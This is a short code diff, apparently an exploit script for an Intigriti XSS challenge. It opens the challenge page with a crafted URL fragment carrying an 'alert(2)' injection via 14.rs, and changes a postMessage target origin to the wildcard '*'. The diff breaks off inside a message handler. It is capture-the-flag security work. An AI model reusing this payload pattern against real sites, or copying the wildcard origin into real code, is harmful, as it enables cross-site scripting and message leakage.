@@ -1,13 +1,9 @@
-<Script>
-	
+<Script>	
 	var popup = window.open("https://challenge.intigriti.io/#https://14.rs/?%0Aalert(2);//%22%3ELOPL","_blank");
-
-// When the popup has fully loaded, if not blocked by a popup blocker:
-
+	
 // This does nothing, assuming the window hasn't changed its location.
 popup.postMessage("https://challenge.intigriti.io",
-                  "https://challenge.intigriti.io");
-
+                  "*");
 
 function receiveMessage(event)
 {
